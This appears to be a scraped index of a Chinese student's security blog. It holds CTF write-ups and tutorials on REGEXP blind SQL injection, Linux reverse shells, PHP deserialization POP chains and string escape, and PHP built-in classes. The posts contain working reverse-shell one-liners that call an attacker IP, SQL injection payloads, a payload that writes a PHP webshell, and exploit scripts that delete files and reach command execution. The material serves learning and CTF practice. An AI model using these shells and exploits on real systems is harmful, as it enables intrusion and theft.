REGEXP盲注语法:注入原理REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。 ^表示pattern(模式串)的开头。即若匹配到username字段下id=1的数据开头为a，则返回1；否则返回0（2）regexp关键字还可以代替where条件里的=号 1select * from users where password regexp '^ad'; 使用场景： 过滤了=、in、like ^若被过滤，可使用$来从后往前进行匹配 常用regexp正则语句： 123regexp '^[a-z]' #判断一个表的第一个字符串是否在a-z中regexp '^r' #判断第一个字符串是否为rregexp '^r[a-z]' #判断一个表的第二个字符串是否在a-z中 （3）在联合查询中的使用 11 union select 1,database() regexp '^s',3--+ 盲注2.判断数据库名 12' or database() regexp '^s'--+ 正常' or database() regexp 'y$'--+ 正常 和上面的like差不多不过通配符不太一样","link":"/2021/02/24/i%E6%98%A5%E7%A7%8B8/"},{"title":"linux反弹shell的本质(二)","text":"什么是反弹shellshell是什么shell可以理解为就是一个可以输入命令的窗口，即命令行窗口 反弹shellreverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转. 反弹shell的本质:文字描述:攻击端为attacker，被攻击端为victimattacker和victim在某一端口实现互联，我们之前说过linux中一切皆文件，所以可以理解是，attacker的输入重定向至victim的输入，victim的输出重定向至attacker构成了这样一个回路接下来我们来分解这一过程: 准备attacker ip：192.168.11.128victim ip: 首先在attacker上监听： 1nc -lvp port 在victim上执行: 1bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 接下来就可以看到在我们的attacker上实现了弹出了victim的shell。 并且可以在此执行命令，获得victim上的内容 剖析命令1.bash -i 1）bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别 2）-i 这个参数表示的是产生交互式的shell 2./dev/tcp/ip/port /dev/tcp|udp/ip/port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的，如下图： 但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信 交互重定向——分解交互过程1实现victim上的输入输出至attacker中（victim输出重定向）在attacker上输入: 1nc -lvp port 在victim上输入: 1base -i &gt; /dev/tcp/ip/port 此时 在victim上的输入，会输出至attacker 但是 attacker却无法对victim进行干扰 2.实现attacker上的输入至victim（victim输入重定向）在victim上输入: 1bash -i &lt; /dev/tcp/192.168.11.128/2333 在attacker上输入的内容就会被重定向至victim中 3.结合以上两条指令在victim上输入: 1bash -i &gt; /dev/tcp/192.168.11.128/2333 0&gt;&amp;1 我们从左到右分析，此时victim的输出重定向至attacker，接下来是0&gt;&amp;1,即将attacker的输入重定向输出到victim的输入，而之前我们说了，victim的输入会重定向输出至attacker，可能有点绕，把这个想象成一个回路 但是，我们在victim上仍然可以看到我们在attacker输入的命令，为什么呢？因为attacker的输入重定向输出到了victim，接下来victim才会根据这个输入执行输出结果 该如何解决呢？使用 :&gt;&amp;word= &gt; word 2&gt;&amp;1 1bash -i &gt;&amp; /dev/tcp/192.168.11.128/2333 0&gt;&amp;1 解析：从victim的标准输出以及标准错误输出都重定向到了attacker，而attacker的输入又重定向输入至victim，此时victim接收到了我们从attacker上的标准输入，执行命令标准输出至attacker，但由于标准错误输出也重定向到了attacker，所以在victim上就看不到我们的命令了。有点绕，还是想象成一个环，只不过刚才的数据环运作过程中，有一个信息停滞没走。 常见的反弹shell语句1.方法一1bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1 和 1bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&lt;&amp;1 这里的唯一区别就是 0&gt;&amp;1 和 0&lt;&amp;1 ，其实就是打开方式的不同，而对于这个文件描述符来讲并没有什么区别（我在上面给出链接的文章中也特地用加粗的形式解释了） 2.方法二1bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 &lt;&amp;2 等价于 1bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&lt;&amp;2 这里再谈谈理解，首先victim的标准输出以及标准错误输出至attacker输出，而attacker的标准输入至victim的标准错误输出上，而victim的标准错误输出边如前面所说的有attacker输出。 3.方法三1exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done 简单的解释一下： 1exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333 这一句将文件描述符5重定向到了 /dev/tcp/192.168.146.129/2333 并且方式是读写方式（这种方法在我的前面的文章中也讲到过），于是我们就能通过文件描述符对这个socket连接进行操作了 1command|while read line do .....done 这个是一个非常经典的句子，它的原句是这样的 1234while read linedo …done &lt; file 从文件中依次读取每一行，将其赋值给 line 变量（当然这里变量可以很多，以空格分隔，这里我就举一个变量的例子，如果是一个变量的话，那么一整行都是它的了），之后再在循环中对line进行操作。 而现在我们不是从file 文件中输入了，我们使用管道符对攻击者机器上输入的命令依次执行，并将标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能。 与之完全类似的还有下面这条指令，读者有兴趣可以自己分析一下： 10&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196 4.方法四nc 如果安装了正确的版本（存在-e 选项就能直接反弹shell） 1nc -e /bin/sh 192.168.146.129 2333 但是如果是没有-e 选项是不是就不能实现了呢？当然不是，我们可以向下面这样 1rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;/tmp/f 简单的解释： mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路 类似的命令： 1mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe 小结通过这两天的学习，感觉对于linux反弹shell终于有了一些更深的理解，感觉对于之前的cat /&gt;flag等的理解都变深了一些，尤其是之间的交互作用的原理de理解 参考:https://xz.aliyun.com/t/2549#toc-4","link":"/2021/02/03/linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8-%E4%BA%8C/"},{"title":"linux反弹shell的本质(一)","text":"文件描述符定义linux文件描述符：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。 当Linux启动的时候会默认打开三个文件描述符，分别是： 标准输入standard input 0 **（默认设备键盘）标准输出standard output **1（默认设备显示器）错误输出：error output 2（默认设备显示器） 文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制） 重定向定义：顾名思义，重定向，就是改变输入输出的方向，针对文件描述符的操作输入方向就是数据从哪里流向程序。数据默认从键盘流向程序，如果改变了它的方向，数据就从其它地方流入，这就是输入重定向。输出方向就是数据从程序流向哪里。数据默认从程序流向显示器，如果改变了它的方向，数据就流向其它地方，这就是输出重定向符号：（1）输入重定向 &lt; &lt;&lt;（2）输出重定向 &gt; &gt;&gt;那么如何实现重定向依靠的就是改变文件描述符 总结一下话，就是把原本要输出的内容输出到文本中，把原本要输入的内容从文本中输入 深入理解1.bash在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向2.如果有多个重定向符号，遵循从左到右的的顺序，切不要随便改变顺序，会带来不一样的结果3.&lt; 是对标准输入0重定向，&gt;是对标准输出1重定向 1.输入重定向格式： [n]&lt; word （注意[n]与&lt;之间没有空格） 说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入） ![img](https://raw.githubusercontent.com/Hwwg/myphoto/master/20210203204231.png) 解释:解析器解析到","link":"/2021/02/03/linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/"},{"title":"my first time to use typro","text":"第一次使用typro","link":"/2020/10/05/my-first-time-to-use-typro/"},{"title":"mysql增删改查","text":"创建数据库创建数据库的方法有1.create database （数据库名）；2.用mysqladmin 创建数据库: mysqladmin -u root -p create (数据库名)3利用PHP脚本创建数据库 删除数据库1.drop database （数据库名字）； 选择数据库1.利用 use（数据库名字） 修改数据库1.修改数据库的输入数据类型格式：alter table （表名） modify （要修改的内容）2.增添数据库中的一个输入项格式：alter table （表名）add （要增加的内容）3.更改原本的数据库项目名字格式： alter table （表名）change column（要修改的） （修改结果）（数据类型）4.修改表名格式：alter table （原本表名） rename （现在想要的表名）这两个都是属于结构设计范畴的。 mysql的增删改查首先是它们的语句命令 增:insert删:delete改：update查:SELECT或者show格式向所有字段插入：insert into 表名（字段1，字段2，字段3……）values(值1,值2，值3……)；向指定字段插入:insert into 表名（指定字段集合） valuse（指定字段值）; 实例 123create table test(id int, name varchar(40),sex varchar(4),birthday date);//新建一个表insert into test(id,name,sex,birthday)//增加数据（插入数据）values(1，'zhangsan'，'male','2001-08-06'); 12update test set sex=female;//所有员工性别更改为女性update test set sex = female where name ='zhangsan';//更改张三这个员工的性别 这边说一下where这个函数的意思：where可以指定你想更换的数据行。删除表数据举例子吧： 123delete from test where name='zhangsan';//删除表中张三的记录delete from test;//删除表中所有的记录truncate table test;//使用truncate删除表中记录 查询表数据 格式：select *或者【字段名】 from 表名；查询所有字段和部分字段。 1234567select id,name,sex,birthday from test;//从表中获取全部数据select name, birthday from test;//从表中获取姓名和生日的信息select birthday from test where sex=male；//获取性别为男性的生日select 数字，数字，数字，数字........;//可以查询指定字段的数据select 要查询的字段名 from 库名.表名；select 要查询的字段名 from 库名.表名 where 已知条件的字段名='已知条件的值'；select 要查询的字段名 from 库名.表名 where 已知条件1的字段名='已知条件1的值' and 已知条件2的字段名='已知条件2的值' 使用distinct去除重复数据select distinct 字段名 from 表名；使用limit指定查询结果的行数select 字段名 from drom 表名 limit n；实例select *from stu limit 1; 使用order by 对结果进行排序order by 字段名 ASC/DESC 修改表数据语法：update 表名 set 字段1=值，字段2=值 ；插入数据insert","link":"/2020/10/20/mysql%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"},{"title":"nep欢乐赛","text":"little trick知识储备**``**反引号：反引号可以用来执行系统命令 **&gt;**：输出重定向符号:(linux反弹shell本质博客中有讲解)可以将内容重定向输出至某个位置 思路:这里一共就三个关键函数，intval、strlen、substr、查找了前面两个的trick都对解题没有帮助，于是看了一下substr函数，可以使用-1进行倒着截断，那么此时也就绕过了len&lt;-1的限制 1234567891011 &lt;?php error_reporting(0); highlight_file(__FILE__); $nep = $_GET['nep']; $len = $_GET['len']; if(intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13){ eval(substr($nep,0,$len)); }else{ die('too long!'); }?&gt; 接下来就是构造eval执行语句: 这里直接放payload进行分析： 123?len=-1&amp;nep=`$_GET[a]`;;&amp;a=ls&gt;1.php?len=-1&amp;nep=`$_GET[a]`;;&amp;a=cat *&gt;1.php?len=-1&amp;nep=`$_GET[a]`;;&amp;a=echo \\&lt;\\?php eval\\(\\$_POST\\[a\\]\\)\\;&gt;123.php//学长解法 从nep后面开始分析：由于我们输入的执行的代码程度是有限制的，所以这里使用一个GET指令传参，这算是一种拼接手法。这条指令拼接完以后就变成了： 123`ls&gt;1.php``cat *&gt;1.php``echo \\&lt;\\?php eval\\(\\$_POST\\[a\\]\\)\\;&gt;123.php` 这里我们分部分详解: ``加反引号，所以可以执行系统命令的echo，系统命令的echo是可以输入内容到文件中的，格式: 1echo 内容 &gt;文件名 为什么需要&gt;文件输出重定向？我们可以发现在这段代码中是没有echo之类的输出函数的，所以此时我们想要输出内容就需要使用输出重定向，将执行命令的结果重定向输出至其他文件中，内容才可以显现。 为什么需要反斜杠：这里的反斜杠是为了屏蔽一些字符的作用，我们知道``里面是执行了系统命令，在linux系统里面&lt; 等都是有其他意义的，如果不加反斜杠直接输入会有歧义导致输入错误 反引号使用详细参考参考:https://blog.csdn.net/u012005313/article/details/46241473 bbxhh_revenge这题写的是挺无语的，要一直换ip，我是用利用手机换飞行模式，再换回来，ip会改变，然后用流量放热点达到更换ip的效果: 然后下面在尝试参数的是比较难受的，感觉有点脑洞，我也是在尝试的过程中 多加了一个一个imagin的参数，画面回显才有不同，接下来就和学长一起讨论往下做。 非预期解 这个也是后来才知道的:在尝试参数的过程中 他有说一句话:你已经可以得到phpinfo了，但是当时没理解这句话的意思，后来才知道，原来在imagin后加上函数才可以打开 预期解: 123456789101112131415161718192021222324252627&lt;?phpfunction waf($s){ return preg_replace('/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\\/\\/|&gt;/i',&quot;NepnEpneP&quot;,$s);}if(isset($_GET['a'])){ $_=waf($_GET['a']); $__=waf($_GET['b']); $a=new $_($__);//new XMLReader}else{ $a=new Error('?');}if(isset($_GET['c'])&amp;&amp; isset($_GET['d'])){ $c=waf($_GET['c']); $d=waf($_GET['d']); eval(&quot;$a-&gt;$c($d)&quot;);//XMLReader -&gt; open('data.xml')}else{ $c='getMesssage'; $d=&quot;&quot;; eval(&quot;echo $a-&gt;$c($d);&quot;);}?&gt; 拿到源码和学长想的是利用内置类，但是有个参数问题没法解决，所以还在等正经wp 梦里花开牡丹亭12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273 &lt;?phphighlight_file(__FILE__);error_reporting(0);include('shell.php');class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-&gt;username='user'; $this-&gt;password='user'; } public function __wakeup(){//这个是md5加密，解密后为admin，那这里应该就需要传入个admin if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;){ $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);//新建一个login类 }else{ $this-&gt;choice = new register(); } } public function __destruct() { $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password); }}class login{ public $file; public $filename; public $content; public function __construct($file,$filename,$content) { $this-&gt;file=$file; $this-&gt;filename=$filename; $this-&gt;content=$content; } public function checking($username,$password) { if($username==='admin'&amp;&amp;$password==='admin'){//在checking里面会检查username和password， $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die('login success you can to open shell file!');//成功了才可以打开。 } }}class register{ public function checking($username,$password)//这边就会检查了 { if($username==='admin'&amp;&amp;$password==='admin'){ die('success register admin'); }else{ die('please register admin '); } }}class Open{ function open($filename, $content){ if(!file_get_contents('waf.txt')){ shell($content); }else{ echo file_get_contents($filename.&quot;.php&quot;); } }}if($_GET['a']!==$_GET['b']&amp;&amp;(md5($_GET['a']) === md5($_GET['b'])) &amp;&amp; (sha1($_GET['a'])=== sha1($_GET['b']))){ @unserialize(base64_decode($_POST['unser']));} 这个是反序列化漏洞，但是我反序列化漏洞只是学了一个比较简单_wakeup()函数的绕过，试着做一下这题,本来想看着学长们的wp做，但是想了一下，反序列化问题有遇到过了，还是尝试自己做一下 POP链条1.反序列化触发wake_up方法，wake_up方法中做了一个判断，我们输入的admin的时候将会跳转到login类当中，会先使用construct方法，对各个变量进行赋值2.接下来将就会返回到Game类中调用_destruct调用方法，又进入到checking类中3.此时将会调用checking方法，这里有个参数 file，我们要对file赋值让他进入Open类中调用file_get_contents函数 EXP1234567891011121314151617181920212223242526&lt;?phpclass Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content;}class login{}class register{}class Open{}$a=new Game;$b=new Open;$a-&gt;register=&quot;admin&quot;;$a-&gt;filename=&quot;shell&quot;;$a-&gt;file=$b;$a-&gt;username=&quot;admin&quot;;$a-&gt;password=&quot;admin&quot;;print(base64_encode(serialize($a)));?&gt; 接下来会获得以下文件: 1234567891011function shell($cmd){ if(strlen($cmd)&lt;10){ if(preg_match('/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/',$cmd)){ die(&quot;NO&quot;); }else{ return system($cmd); } }else{ die('so long!'); }} 原来这段代码还没结束，还有下文，这里有个shell方法是在我们上面那个判断语句当中的，当waf.txt不存在的时候才会调用这个shell方法现在我们需要删除这个waf.txt，由于以上没有我们可以利用的类，所以这里很明显需要使用内置类进行删除（跟那个bbxhh-revenge有神似的地方）这里需要寻找一个能直接删除的内置类: 利用此代码即可删除 所以序列化一下： 12345678910111213141516171819202122232425262728&lt;?phpclass Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content;}class login{}class register{}class Open{}$a=new Game;//$b=new Open;$zip=new ZipArchive();$a-&gt;register=&quot;admin&quot;;$a-&gt;filename=&quot;waf.txt&quot;;$a-&gt;content=ZipArchive::OVERWRITE;//这里记得不能加引号$a-&gt;file=$zip;$a-&gt;username=&quot;admin&quot;;$a-&gt;password=&quot;admin&quot;;print(base64_encode(serialize($a))); 接下来就是写入代码执行shell了 在反序列化那边对content参数进行修改（用得是第一个反序列化代码），执行ls没找到flag应该是在根目录了，然后ls / 发现flag目录 感觉flag就在里面了，于是使用php /flag即可打开","link":"/2021/03/21/nep%E6%AC%A2%E4%B9%90%E8%B5%9B/"},{"title":"php反序列化pop链构造","text":"前言:nep比赛做了很多关于类的调用以及反序列化问题，正好这块内容是我还没学习的（早知道寒假的时候就耐着性子学完了），于是趁着部门的工作今天还没安排，决定赶紧开始做一下。 pop链介绍从现有类中寻找我们可以恶意使用的方法、函数，构造利用链，使得程序会按着我们的需要最终执行恶意语句 预备知识 方法名 调用条件 __call 调用不可访问或不存在的方法时被调用 __callStatic 调用不可访问或不存在的静态方法时被调用 __clone 进行对象clone时被调用，用来调整对象的克隆行为 __constuct 构建对象的时被调用； __debuginfo 当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本 __destruct 明确销毁对象或脚本结束时被调用； __get 读取不可访问或不存在属性时被调用 __invoke 当以函数方式调用对象时被调用 __isset 对不可访问或不存在的属性调用isset()或empty()时被调用 __set 当给不可访问或不存在属性赋值时被调用 __set_state 当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。 __sleep 当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用 __toString 当一个类被转换成字符串时被调用 __unset 对不可访问或不存在的属性进行unset时被调用 __wakeup 当使用unserialize时被调用，可用于做些对象的初始化操作 3.反序列化的常见起点__wakeup 一定会调用 __destruct 一定会调用 __toString 当一个对象被反序列化后又被当做字符串使用 4.反序列化的常见中间跳板:__toString 当一个对象被当做字符串使用 __get 读取不可访问或不存在属性时被调用 __set 当给不可访问或不存在属性赋值时被调用 __isset 对不可访问或不存在的属性调用isset()或empty()时被调用 形如 $this-&gt;$func(); 5.反序列化的常见终点:__call 调用不可访问或不存在的方法时被调用 call_user_func 一般php代码执行都会选择这里 call_user_func_array 一般php代码执行都会选择这里 6.Phar反序列化原理以及特征phar://伪协议会在多个函数中反序列化其metadata部分受影响的函数包括不限于如下: copy,file_exists,file_get_contents,file_put_contents,file,fileatime,filectime,filegroup,fileinode,filemtime,fileowner,fileperms,fopen,is_dir,is_executable,is_file,is_link,is_readable,is_writable,is_writeable,parse_ini_file,readfile,stat,unlink,exif_thumbnailexif_imagetype,imageloadfontimagecreatefrom,hash_hmac_filehash_filehash_update_filemd5_filesha1_file,get_meta_tagsget_headers,getimagesizegetimagesizefromstring,extractTo 实战&lt;?php//flag is in flag.phperror_reporting(0);class Read { public $var; public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } public function __invoke(){ $content = $this-&gt;file_get($this-&gt;var); echo $content; }}class Show{ public $source; public $str; public function __construct($file='index.php') { $this-&gt;source = $file; echo $this-&gt;source.'Welcome'.&quot;&lt;br&gt;&quot;; } public function __toString() { return $this-&gt;str['str']-&gt;source; } public function _show() { if(preg_match('/gopher|http|ftp|https|dict|\\.\\.|flag|file/i',$this-&gt;source)) { die('hacker'); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) { echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; } }}class Test{ public $p; public function __construct() { $this-&gt;p = array(); } public function __get($key) { $function = $this-&gt;p; return $function(); }}if(isset($_GET['hello'])){ unserialize($_GET['hello']);}else{ $show = new Show('pop3.php'); $show-&gt;_show();} 思路：寻找目标函数——进行回溯——构造利用链 1.反序列化将会触发wake_up函数，而wake_up函数在show类当中2.show类中的wake_up函数执行时将会经过一个正则匹配，这里匹配的是source这个量，而正则匹配的时候source是被当做字符串进行匹配的，前面有说过如果__tostring的触发方式，所以这里如果我们将source赋为一个类对象，那么就会触发__tostring3.这里的tostring会去寻找str这个数组，取出其中的值赋给source，如果找不到就会触发__get方法，我们再来看看get在哪，在test类当中4.这里的get方法他是获取一个p并将其作为函数使用的，这里就会调用__invoke魔术方法5.而__invoke魔术方法存在于Read类中，这里调用了file_get方法后调用了file_get_content读取文件，而这里的参数是我们可控的，所以我们的pop利用链如下:POP链：unserialize函数（变量可控）-&gt;__wakeup()魔术方法-&gt;__tostring()-&gt;__get魔术方法-&gt;__invoke魔术方法-&gt;触发read类中的file_get_contents函数 exp编写&lt;?phpclass Read{ public $var=&quot;flag.php&quot;;}class Show{ public $source; public $str;}class Test{ public $p;}$r=new Read();$s=new Show();$t=new Test();$t-&gt;p=$r;//赋值Test类的对象$t下的属性p为Read类的对象($r),触发__invoke魔术方法$s-&gt;str['str']=$t;//赋值show类的对象（$s）下的str数组的str键的值为Test类的对象$t，触发__get魔术方法。$s-&gt;source=$s;//令show类中的对象$s下的source属性进入wake_up函数，这样就会触发tostring魔术方法echo urlencode((serialize($s))); nep——梦里花开牡丹亭跳转战场，回去构造一下nep的题 &lt;?phphighlight_file(__FILE__);error_reporting(0);include('shell.php');class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-&gt;username='user'; $this-&gt;password='user'; } public function __wakeup(){ admin if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;){ $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);//新建一个login类 }else{ $this-&gt;choice = new register(); } } public function __destruct() { $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password); }}class login{ public $file; public $filename; public $content; public function __construct($file,$filename,$content) { $this-&gt;file=$file; $this-&gt;filename=$filename; $this-&gt;content=$content; } public function checking($username,$password) { if($username==='admin'&amp;&amp;$password==='admin'){ $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die('login success you can to open shell file!'); } }}class register{ public function checking($username,$password)//这边就会检查了 { if($username==='admin'&amp;&amp;$password==='admin'){ die('success register admin'); }else{ die('please register admin '); } }}class Open{ function open($filename, $content){ if(!file_get_contents('waf.txt')){ shell($content); }else{ echo file_get_contents($filename.&quot;.php&quot;); } }}if($_GET['a']!==$_GET['b']&amp;&amp;(md5($_GET['a']) === md5($_GET['b'])) &amp;&amp; (sha1($_GET['a'])=== sha1($_GET['b']))){ @unserialize(base64_decode($_POST['unser']));} 1.反序列化触发wake_up方法，wake_up方法中做了一个判断，我们输入的admin的时候将会跳转到login类当中2.此时将会调用checking方法，这里有个参数 file，我们要对file赋值让让他进入Open类中调用file_get_contents函数 EXP&lt;?phpclass Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content;}class login{}class register{}class Open{}$a=new Game;$b=new Open;$a-&gt;register=&quot;admin&quot;;$a-&gt;filename=&quot;shell&quot;;$a-&gt;file=$b;$a-&gt;username=&quot;admin&quot;;$a-&gt;password=&quot;admin&quot;;print(base64_encode(serialize($s)); 小结POP链的构造，其实一开始没仔细学习的时候我以为很简单，因为我想当然了，也是因为不了解各个魔术方法，所以以为是自己想去哪个函数就可以去哪个函数，但其实不是的，其中的逻辑性还是挺强的，可以先构造一个，然后再去慢慢调试。 https://xz.aliyun.com/t/8082","link":"/2021/03/25/php-pop%E9%93%BE%E6%9E%84%E9%80%A0/"},{"title":"php反序列化字符串逃逸","text":"前言:反序列化确实有很多内容需要去学，前段时间学习的反序列化确实不够用 基础知识:1.php在反序列化时，对类中不存在的属性也会进行反序列化 12345678&lt;?phpclass test{ public $test=&quot;aaaaa&quot;;}$b=new test();$s='O:4:&quot;test&quot;:2:{s:4:&quot;test&quot;;s:5:&quot;aaaaa&quot;;s:4:&quot;tess&quot;;s:5:&quot;aaaaa&quot;;}';var_dump(unserialize($s)); 2.php在反序列化时，底层代码是以；作为字段的分割，以}作为结果（字符串除外），并且是根据长度判断内容的3.对于类似这种O:1:”A”:2:{s:1:”a”;s:3:”123”;s:1:”b”;s:9:”xianyu123”;}s:1:”c”;s:2:”yes”;也是能够正常反序列化的，即使s:2:”yes”的长度不匹配也不影响。说明php在反序列化的时候只要求一个反序列化字符串块合法即可，当然得是第一个字符串块。 漏洞产生原因序列化的字符串在经过过滤函数不正确的处理而导致对象注入，因为先进行了序列化，再进行过滤，那么就有可能会产生此漏洞。 实战123456789101112131415&lt;?phpfunction filter($f){ $filter = '/c/i'; return preg_replace($filter,'bb',$f);}$username = &quot;admin&quot;;$password = &quot;mypass&quot;;$user = array($username, $password);var_dump(serialize($user));echo &quot;\\n&quot;;$r = filter(serialize($user));var_dump($r);echo &quot;\\n&quot;;var_dump(unserialize($r));?&gt; 首先看看原本输出的内容: 12345678string(39) &quot;a:2:{i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;mypass&quot;;}&quot;array(2) { [0] =&gt; string(5) &quot;admin&quot; [1] =&gt; string(6) &quot;mypass&quot;} 1$username = &quot;ggggyu123cccccccccccccccccccc\\&quot;;i:1;s:6:\\&quot;123456\\&quot;;}&quot;; 123456789101112131415string(84) &quot;a:2:{i:0;s:49:&quot;ggggyu123cccccccccccccccccccc&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:6:&quot;mypass&quot;;}&quot;D:\\apache\\www\\反序列化字符串逃逸.php:12:string(104) &quot;a:2:{i:0;s:49:&quot;ggggyu123bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:6:&quot;mypass&quot;;}&quot;D:\\apache\\www\\反序列化字符串逃逸.php:14:array(2) { [0] =&gt; string(49) &quot;ggggyu123bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot; [1] =&gt; string(6) &quot;123456&quot;}进程已结束，退出代码 0 此时成功更改密码，刚刚理解了一下，其实原理很简单，先理解以下几点:1.对应前一个序列化内容s:49这里说第一个变量的值有49个字符长度，那么接下来就会一直读取49个长度，如果少于或者大于都会报错导致读取不了2.经过filter，我们发现一个c被替换成两个b了，但是依旧字符串长度为49个，但是我们原本在username里面的内容是变多了，这样我们后面输入的i:1;s:6:”123456”;}就逃逸出来了3.我们知道序列化是以读到}为终止的，所以此时密码就被修改为123456，因为后面的mypass那些已经被舍弃掉了","link":"/2021/04/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"},{"title":"php反序列化问题","text":"pravite和Protected成员的序列化private类private声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见 private型在序列化的格式为:%00类名%00 protectprotected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上 \\0*\\0 的前缀，注意，这里的 \\0 表示 ASCII 码为 0的字符，也就是我们经过 urlencode 后看到的 %00 。 *private型在序列化的格式为:%00%00** var和publicvar 和 public声明的字段都是公共字段，因此它们的字段名的序列化格式是相同的。公共字段的字段名按照声明时的字段名进行序列化，但序列化后的字段名中不包括声明时的 变量前缀符号 $。 实例:12345678910&lt;?php class test{ public $name=&quot;ghtwf01&quot;; private $age=&quot;18&quot;; protected $sex=&quot;man&quot;; } $a=new test(); $a=serialize($a); print_r($a);?&gt; 1O:4:&quot;test&quot;:3:{s:4:&quot;name&quot;;s:7:&quot;ghtwf01&quot;;s:9:&quot; test age&quot;;s:2:&quot;18&quot;;s:6:&quot; * sex&quot;;s:3:&quot;man&quot;;} 但是复制到URL中可能会丢失所以此时需要按如上说明进行标记 trick1.在php7.1+对类属性的检测不严格，所以可以用public来绕过 php内置类整理近期遇到许多关于PHP内置类的题目，故在此整理一下: 12345678910111213141516171819202122&lt;?php$classes = get_declared_classes();foreach ($classes as $class) { $methods = get_class_methods($class); foreach ($methods as $method) { if (in_array($method, array( '__destruct', '__toString', '__wakeup', '__call', '__callStatic', '__get', '__set', '__isset', '__unset', '__invoke', '__set_state' ))) { print $class . '::' . $method . &quot;\\n&quot;; } }} 使用此代码 可以获取大部分的内置类:这里就先说一下到目前为止遇到过的: 123$a=new ZipArchive();$a-&gt;filename=&quot;xxxx.xxx&quot;;$a-&gt;content=ZipArchive::OVERWRITE; 类 描述 DirectoryIterator 遍历目录 FilesystemIterator 遍历目录 GlobIterator 遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag* SplFileObject 读取文件，按行读取，多行需要遍历 finfo/finfo_open() 需要两个参数 ZipArchive() 任意文件删除 实例:123$a=new ZipArchive();$a-&gt;filename=&quot;xxxx.xxx&quot;;$a-&gt;content=ZipArchive::OVERWRITE; 12345678&lt;?phpclass A{ public $class='FilesystemIterator'; public $para=&quot;/var/www/html&quot;; public $check; }$o = new A();echo serialize($o); 123456789&lt;?phpclass A{ public $class='SplFileObject'; public $para=&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;; public $check; }$o = new A();echo 